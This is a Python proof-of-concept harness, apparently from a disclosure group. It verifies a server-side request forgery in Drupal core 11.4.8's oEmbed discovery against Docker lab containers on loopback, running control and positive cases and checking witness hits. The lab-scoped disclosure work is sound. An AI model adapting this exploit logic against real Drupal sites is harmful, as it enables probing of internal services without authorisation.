#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: drupal-oembed-ssrf (Medium: 6.1)
#  Vendor: Drupal core (Drupal)
#  Versions: Drupal core 11.4.8
#  Impact: oEmbed discovery second hop GETs an unscoped href after SA-CORE-2026-008
#  Requires: Docker Compose, loopback gadget PHP plus firsthop HTML
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "drupal-oembed-ssrf"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove Drupal 11.4.8 oEmbed discovery second-hop SSRF (SA-CORE-2026-008 leftover)."""


import json
import os
import subprocess
import time
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any

LABEL = "drupal-oembed-ssrf"
WITNESS = "DRUPAL-OEMBED-SSRF-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = Path(__file__).resolve().parent
FIRSTHOP = os.environ.get("FIRSTHOP_URL", "http://127.0.0.1:19510").rstrip("/")
FIRST_HOP_URL = os.environ.get("FIRST_HOP_URL", "http://firsthop:8080/video.html")
SECOND_HOP_URL = os.environ.get("SECOND_HOP_URL", "http://127.0.0.1:18080/oembed")
PIN_VERSION = "11.4.8"
PIN_SHA = "61044508071749629aaf3380aa85971e94df9e84"


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def success(detail: str) -> int:
    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
    return 0


def clip(text: str, limit: int = 240) -> str:
    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
    )


def http_json(url: str, method: str = "GET", timeout: float = 8.0) -> tuple[int, Any]:
    req = urllib.request.Request(url, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read().decode("utf-8", "replace")
            status = int(resp.status)
    except urllib.error.HTTPError as exc:
        raw = exc.read().decode("utf-8", "replace")
        status = int(exc.code)
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return 0, f"{type(exc).__name__}:{exc}"
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, raw


def wait_firsthop() -> str | None:
    deadline = time.time() + 90
    last = "none"
    while time.time() < deadline:
        status, body = http_json(f"{FIRSTHOP}/health")
        last = f"status={status} body={clip(str(body), 80)!r}"
        if status == 200:
            log(f"IOC firsthop-ready {last}")
            return None
        log(f"IOC firsthop-wait {last}")
        time.sleep(1)
    return f"firsthop-not-ready {last}"


def gadget_exec(php_args: list[str]) -> tuple[int, dict[str, Any], str]:
    proc = compose(
        "exec",
        "-T",
        "gadget",
        "php",
        "/lab/gadget.php",
        *php_args,
        timeout=45,
    )
    combined = (proc.stdout or "") + (proc.stderr or "")
    payload: dict[str, Any] = {}
    for line in (proc.stdout or "").splitlines():
        line = line.strip()
        if line.startswith("{") and line.endswith("}"):
            try:
                parsed = json.loads(line)
            except json.JSONDecodeError:
                continue
            if isinstance(parsed, dict):
                payload = parsed
    return proc.returncode, payload, combined


def oracle_json(path: str, method: str = "GET") -> tuple[int, Any, str]:
    proc = compose(
        "exec",
        "-T",
        "gadget",
        "python3",
        "-c",
        (
            "import json,urllib.request,sys;"
            f"req=urllib.request.Request('http://127.0.0.1:18080{path}',method='{method}');"
            "resp=urllib.request.urlopen(req,timeout=5);"
            "sys.stdout.write(resp.read().decode('utf-8','replace'))"
        ),
        timeout=20,
    )
    raw = (proc.stdout or "").strip()
    err = (proc.stderr or "").strip()
    if proc.returncode != 0:
        return proc.returncode, raw, err
    try:
        return 0, json.loads(raw), err
    except json.JSONDecodeError:
        return 0, raw, err


def reset_oracles() -> str | None:
    status, body = http_json(f"{FIRSTHOP}/reset", method="POST")
    if status != 200:
        return f"firsthop-reset status={status} body={clip(str(body))}"
    code, body, err = oracle_json("/reset", method="POST")
    if code != 0:
        return f"oracle-reset rc={code} body={clip(str(body))} err={clip(err)}"
    return None


def firsthop_count() -> int:
    status, body = http_json(f"{FIRSTHOP}/hits")
    if status != 200 or not isinstance(body, dict):
        return -1
    count = body.get("count")
    return int(count) if isinstance(count, int) else -1


def oracle_count_and_witness() -> tuple[int, bool]:
    code, body, _err = oracle_json("/hits")
    if code != 0 or not isinstance(body, dict):
        return -1, False
    count = body.get("count")
    n = int(count) if isinstance(count, int) else -1
    blob = json.dumps(body)
    return n, WITNESS in blob


def wait_oracle() -> str | None:
    deadline = time.time() + 90
    last = "none"
    while time.time() < deadline:
        code, body, err = oracle_json("/health")
        last = f"rc={code} body={clip(str(body), 80)!r} err={clip(err, 80)!r}"
        if code == 0 and str(body).strip() == "ok":
            log(f"IOC oracle-ready {last}")
            return None
        log(f"IOC oracle-wait {last}")
        time.sleep(1)
    return f"oracle-not-ready {last}"


def main() -> int:
    log(f"IOC lab={LABEL} pin={PIN_VERSION} sha={PIN_SHA} firsthop={FIRSTHOP}")
    err = wait_firsthop()
    if err:
        return fail(err)
    err = wait_oracle()
    if err:
        return fail(err)
    err = reset_oracles()
    if err:
        return fail(err)

    rc, payload, combined = gadget_exec(["--patterns", "", "--url", FIRST_HOP_URL])
    log(f"IOC control-empty rc={rc} payload={clip(json.dumps(payload))}")
    if combined.strip():
        for line in combined.splitlines():
            if line.startswith("IOC "):
                log(line)
    if rc != 0:
        return fail(f"control-empty gadget rc={rc} {clip(combined)}")
    if payload.get("discovered"):
        return fail("control-empty discovered a href with default-off patterns")
    if firsthop_count() != 0:
        return fail(f"control-empty first hop ran count={firsthop_count()}")
    n, _has = oracle_count_and_witness()
    if n != 0:
        return fail(f"control-empty second hop ran count={n}")
    log("IOC control-empty ok discovered=false first=0 second=0")

    err = reset_oracles()
    if err:
        return fail(err)
    rc, payload, combined = gadget_exec(
        ["--patterns", "^not-this-host$", "--url", FIRST_HOP_URL]
    )
    log(f"IOC control-wrong-host rc={rc} payload={clip(json.dumps(payload))}")
    if payload.get("discovered"):
        return fail("wrong-host pattern still discovered a href")
    if firsthop_count() != 0:
        return fail(f"wrong-host first hop ran count={firsthop_count()}")
    n, _has = oracle_count_and_witness()
    if n != 0:
        return fail(f"wrong-host second hop ran count={n}")
    log("IOC control-wrong-host ok discovered=false")

    err = reset_oracles()
    if err:
        return fail(err)
    rc, payload, combined = gadget_exec(
        ["--patterns", "^firsthop$", "--url", FIRST_HOP_URL]
    )
    log(f"IOC positive rc={rc} payload={clip(json.dumps(payload))}")
    for line in combined.splitlines():
        if line.startswith("IOC "):
            log(line)
    discovered = payload.get("discovered")
    if discovered != SECOND_HOP_URL:
        return fail(f"positive discovered={discovered!r} expected={SECOND_HOP_URL}")
    if int(payload.get("second_hop_status") or 0) != 200:
        return fail(f"positive second-hop status={payload.get('second_hop_status')}")
    if not payload.get("witness_in_body"):
        return fail("positive second-hop body missing witness")
    if firsthop_count() < 1:
        return fail(f"positive first hop missing count={firsthop_count()}")
    n, has_witness = oracle_count_and_witness()
    if n < 1 or not has_witness:
        return fail(f"positive oracle count={n} witness={has_witness}")
    log(
        "IOC positive ok discovered="
        f"{discovered} first={firsthop_count()} second={n}"
    )
    return success(
        "how=gadget "
        f"pin={PIN_VERSION} "
        "first-hop=allowed "
        "second-hop=127.0.0.1:18080 "
        "default-off=blocked"
    )


if __name__ == "__main__":
    raise SystemExit(main())

